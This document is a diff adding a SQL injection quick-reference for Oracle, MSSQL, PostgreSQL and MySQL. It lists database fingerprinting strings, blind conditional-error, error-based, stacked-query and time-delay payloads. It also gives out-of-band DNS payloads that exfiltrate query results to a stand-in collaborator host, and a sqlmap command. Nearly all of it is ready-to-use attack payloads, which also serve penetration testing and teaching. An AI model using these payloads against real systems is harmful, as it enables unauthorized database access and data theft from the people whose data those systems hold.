@@ -1,0 +1,44 @@
+SQLi SYNTAX — QUICK REF  (Oracle | MSSQL | PostgreSQL | MySQL)
+
+Fingerprint first — string concat that returns "foobar" tells you the DB:
+    'a'||'b'  = Oracle/Postgres   |   'a'+'b' = MSSQL   |   'a' 'b' = MySQL
+
+Concat        ORA 'a'||'b'   MSSQL 'a'+'b'   PG 'a'||'b'   MySQL 'a' 'b' / CONCAT('a','b')
+Substring     SUBSTR / SUBSTRING('foobar',4,2) -> "ba"  (1-indexed)
+Comment       -- (ORA/MSSQL/PG)  |  # or "-- " (MySQL, needs space)  |  /* */
+              in URLs use  -- -
+Version       ORA SELECT banner FROM v$version   MSSQL/MySQL @@version   PG version()
+Tables/cols   ORA all_tables / all_tab_columns    others: information_schema.tables/.columns
+              ...WHERE table_name='<TABLE>'         (Oracle has NO information_schema)
+
+BLIND — conditional error (swap 1=1 for SUBSTR(...)='x'):
+    ORA    SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual
+    MSSQL  SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END
+    PG     1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)
+    MySQL  SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')
+
+ERROR-BASED (data in visible error):
+    MSSQL  SELECT 'foo' WHERE 1 = (SELECT 'secret')
+    PG     SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
+    MySQL  extractvalue(1,concat(0x7e,(SELECT @@version)))   (~32 char cap, chunk w/ SUBSTR)
+
+STACKED QUERIES:  MSSQL & PG yes ( ; )   |   Oracle no   |   MySQL rarely
+
+TIME DELAY (10s):
+    ORA dbms_pipe.receive_message(('a'),10)   MSSQL WAITFOR DELAY '0:0:10'
+    PG  SELECT pg_sleep(10)                    MySQL SELECT SLEEP(10)
+  conditional:
+    MSSQL  IF (1=1) WAITFOR DELAY '0:0:10'
+    PG     SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
+    MySQL  SELECT IF(1=1,SLEEP(10),0)
+    ORA    SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+
+OOB / DNS (replace COLLAB with your Burp Collaborator subdomain):
+    ORA    SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY % r SYSTEM "http://COLLAB/"> %r;]>'),'/l') FROM dual
+    MSSQL  exec master..xp_dirtree '//COLLAB/a'
+    PG     copy (SELECT '') to program 'nslookup COLLAB'
+    MySQL  LOAD_FILE('\\\\COLLAB\\a')   (Windows only)
+  exfil: prepend (SELECT <QUERY>) as a subdomain -> value lands in the DNS log
+         (labels <=63 chars, hex/base-encode long or binary values)
+
+Automate:  sqlmap --dbms=<db> --technique=BEUSTQ  (Boolean/Error/Union/Stacked/Time/inline-Query)
